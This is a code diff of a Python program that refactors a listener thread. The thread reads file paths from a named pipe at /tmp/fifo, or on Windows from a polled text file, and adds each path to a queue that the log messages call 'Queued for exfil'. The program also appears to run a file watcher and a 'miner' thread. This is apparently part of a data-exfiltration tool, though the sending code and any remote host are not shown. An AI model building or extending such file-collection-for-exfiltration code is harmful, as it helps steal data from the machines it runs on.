@@ -40,13 +40,6 @@ else:
 
 IS_WINDOWS = platform.system() == "Windows"
 
-if IS_WINDOWS:
-    FIFO_PATH = "fifo_sim.txt"
-    # Use file-based listener
-else:
-    FIFO_PATH = "/tmp/fifo"
-    if not os.path.exists(FIFO_PATH):
-        os.mkfifo(FIFO_PATH)
 
 # ========== COMPONENTS ==========
 
@@ -175,52 +168,59 @@ def file_watcher_loop(miner_id, stop_event):
 
 
 def fifo_listener_loop(stop_event):
-    if not os.path.exists(FIFO_PATH):
-        os.mkfifo(FIFO_PATH)
-        logger.info(f"[+] Created FIFO at {FIFO_PATH}")
+    if IS_WINDOWS:
+        # Use file-based listener
+        FIFO_PATH = "fifo_sim.txt"
+        last_pos = 0
+        path = "fifo_sim.txt"
+        open(path, "a").close()  # ensure it exists
 
-    fifo = open(FIFO_PATH, "r")
-    logger.info("[*] FIFO listener started.")
-
-    try:
+        logger.info("[*] FIFO (sim) listener started.")
         while not stop_event.is_set():
-            rlist, _, _ = select.select([fifo], [], [], 1)
-            if fifo in rlist:
-                while True:
-                    line = fifo.readline()
-                    if not line:
-                        break  # end of current batch of input
+            with open(path, "r") as f:
+                f.seek(last_pos)
+                lines = f.readlines()
+                last_pos = f.tell()
+
+                for line in lines:
                     filepath = line.strip()
                     if os.path.isfile(filepath):
                         file_stack.add(filepath)
                         logger.info(f"[+] Queued for exfil: {filepath}")
-                    else:
-                        logger.warning(f"[!] Ignored non-file path: {filepath}")
-    except Exception as e:
-        logger.error(f"[!] FIFO listener error: {e}")
-    finally:
-        fifo.close()
-        logger.info("[*] FIFO listener stopped.")
+            time.sleep(1)
+    else:
+        FIFO_PATH = "/tmp/fifo"
+        if not os.path.exists(FIFO_PATH):
+            os.mkfifo(FIFO_PATH)
+
+        if not os.path.exists(FIFO_PATH):
+            os.mkfifo(FIFO_PATH)
+            logger.info(f"[+] Created FIFO at {FIFO_PATH}")
+
+        fifo = open(FIFO_PATH, "r")
+        logger.info("[*] FIFO listener started.")
+
+        try:
+            while not stop_event.is_set():
+                rlist, _, _ = select.select([fifo], [], [], 1)
+                if fifo in rlist:
+                    while True:
+                        line = fifo.readline()
+                        if not line:
+                            break  # end of current batch of input
+                        filepath = line.strip()
+                        if os.path.isfile(filepath):
+                            file_stack.add(filepath)
+                            logger.info(f"[+] Queued for exfil: {filepath}")
+                        else:
+                            logger.warning(f"[!] Ignored non-file path: {filepath}")
+        except Exception as e:
+            logger.error(f"[!] FIFO listener error: {e}")
+        finally:
+            fifo.close()
+            logger.info("[*] FIFO listener stopped.")
 
 
-def fifo_sim_listener_loop(stop_event):
-    last_pos = 0
-    path = "fifo_sim.txt"
-    open(path, "a").close()  # ensure it exists
-
-    logger.info("[*] FIFO (sim) listener started.")
-    while not stop_event.is_set():
-        with open(path, "r") as f:
-            f.seek(last_pos)
-            lines = f.readlines()
-            last_pos = f.tell()
-
-            for line in lines:
-                filepath = line.strip()
-                if os.path.isfile(filepath):
-                    file_stack.add(filepath)
-                    logger.info(f"[+] Queued for exfil: {filepath}")
-        time.sleep(1)
 
 
 # ========== MAIN ENTRY ==========
@@ -229,7 +229,6 @@ def fifo_sim_listener_loop(stop_event):
 def main():
     miner_id = uuid.uuid4().hex
     stop_event = threading.Event()
-    fifo_loop = fifo_listener_loop if not IS_WINDOWS else fifo_sim_listener_loop
 
     threads = [
         threading.Thread(
@@ -243,7 +242,7 @@ def main():
             daemon=True,
         ),
         threading.Thread(
-            target=fifo_loop,
+            target=fifo_listener_loop,
             args=(stop_event,),
             daemon=True,
         ),
